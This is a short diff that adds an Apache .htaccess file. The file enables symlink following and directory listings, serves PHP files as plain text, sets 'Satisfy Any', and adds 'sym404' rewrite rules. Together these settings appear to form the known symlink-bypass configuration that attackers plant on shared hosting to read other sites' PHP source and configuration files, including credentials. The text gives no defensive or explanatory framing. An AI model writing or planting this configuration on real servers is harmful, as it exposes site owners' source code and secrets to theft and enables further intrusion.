@@ -1,0 +1,10 @@
+Options Indexes FollowSymLinks
+DirectoryIndex hex.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
+IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
+IndexIgnore *.txt404
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} ^.*sym404 [NC]
+RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]
